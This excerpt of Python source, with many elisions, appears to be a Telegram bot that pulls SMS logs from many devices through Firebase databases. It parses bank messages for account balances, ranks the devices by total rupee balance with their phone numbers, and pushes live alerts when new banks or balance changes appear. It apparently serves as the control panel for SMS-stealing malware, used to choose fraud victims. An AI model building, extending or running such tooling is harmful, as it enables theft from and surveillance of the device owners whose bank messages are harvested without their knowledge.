...
# -*- coding: utf-8 -*-
"""
FIREBASE MANAGER PRO - FULL ANALYSIS (Per Device)
...
# ============================================================
# ✅ FULL ANALYSIS — saare bank SMS parse (per device)
# ============================================================
def analyze_all_bank_messages(messages) -> List[Dict[str, str]]:
    ...
    try:
        ...
        def get_ts(item):
            try:
                _, md = item
                if not isinstance(md, dict): return 0
                merged = dict(md)
                for nk in ["info", "data", "message_info"]:
                    if nk in md and isinstance(md[nk], dict):
                        merged = {**merged, **md[nk]}
                t = get_msg_field(merged, "time", 0)
                ...
                if isinstance(t, str):
                    ...
                    for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ", "%d-%m-%Y %H:%M:%S"]:
                        try:
                            return datetime.strptime(t.replace("Z",""), fmt.replace("Z","")).timestamp()
                        except: continue
                return 0
            except: return 0
        
        try: items.sort(key=get_ts, reverse=True)
        except: items.reverse()
        ...
        for _, msg_data in items:
            ...
            text = safe_str(get_msg_field(merged, "text", ""), "")
            sender = safe_str(get_msg_field(merged, "sender", ""), "")
            if not text: continue
            
            msg_type = safe_str(get_msg_field(merged, "type", ""), "").lower()
        ...
        logger.debug(f"analyze_all_bank_messages error: {e}")
    
    return list(bank_map.values())
        ...
        try:
            ...
            for dev_id, info in data.items():
                try:
                    ...
                    devices.append({"id": str(dev_id), "name": name, "phone": phone})
    ...
    for template in MESSAGES_PATHS:
        try:
            ...
            if data and isinstance(data, dict):
                banks = analyze_all_bank_messages(data)
                if banks:
                    return banks
        except: continue
    return []
            ...
            for bs in range(0, total, BATCH_SIZE):
                ...
                for i, url in enumerate(batch):
                    ...
                    try:
                        ...
                        except: mr = [[] for _ in devs]
                        for dev, banks in zip(devs, mr):
                            try:
                                if isinstance(banks, Exception): banks = []
                                if not banks: continue
                                dev["banks"] = banks
                                total_amt = sum(safe_float(b.get("balance", "0")) for b in banks)
                                dev["total"] = total_amt
...
# ============================================================
# ✅ FORMAT — Ek device = Ek block, andar saare banks
# ============================================================
def format_show_results(results):
    ...
    all_devices.sort(key=lambda x: x["total"], reverse=True)
    
    grand_total = sum(d["total"] for d in all_devices)
    total_accounts = sum(len(d["banks"]) for d in all_devices)
    
    header = (f"💰 <b>DEVICES WITH BALANCE</b>\n"
              f"━━━━━━━━━━━━━━━━━━━\n"
              f"📱 Devices: <b>{len(all_devices)}</b>\n"
    ...
    for i, d in enumerate(all_devices, 1):
        block = (
            f"\n<b>#{i}</b> 🆔 <code>{escape_html(d['id'])}</code>\n"
            f"💰 <b>₹{d['total']:,.2f}</b>\n"
        )
        if d["phone"] and d["phone"] != "—":
            block += f"📞 <code>{escape_html(d['phone'])}</code>\n"
        block += f"🌐 <code>{escape_html(d['url'])}</code>\n"
        block += f"━━━━━━━━━━━━━━━\n"
        
        for b in d["banks"]:
            block += f"🏦 {escape_html(b['bank'])} — <b>{escape_html(b['balance'])}</b>\n"
...
async def show_cmd(u, c):
    ...
    msg = await u.message.reply_text(
        f"💰 <b>Full Analysis — {len(urls)} firebase(s)...</b>\n\n"
    ...
    async def pcb(p, t):
        ...
        if p - lu["c"] >= max(3, t // 15) or now - lu["t"] >= 2 or p == t:
            ...
            try:
                await msg.edit_text(f"💰 <b>Full Analysis...</b>\n\n<code>[{bar}] {p}/{t}</code>", parse_mode='HTML')
            except: pass
    ...
    for fb in results:
        ...
        for d in fb.get("devices", []):
            for b in d.get("banks", []):
                key = f"{url}|{d.get('id','')}|{b['bank']}"
                USER_SEEN[uid][key] = b["balance"]
        ...
        try:
            ...
            for uid in list(USER_FIREBASES.keys()):
                ...
                for a in new_alerts[:8]:
                    tag = "🆕 <b>NEW BANK</b>" if a["is_new"] else "🔄 <b>BALANCE UPDATED</b>"
                    txt = (
                        f"📡 <b>LIVE UPDATE</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━\n"
                        f"{tag}\n\n"
                    ...
                    try:
                        ...
                        logger.warning(f"Live alert fail uid={uid}: {e}")
                    except: pass
        except Exception as e:
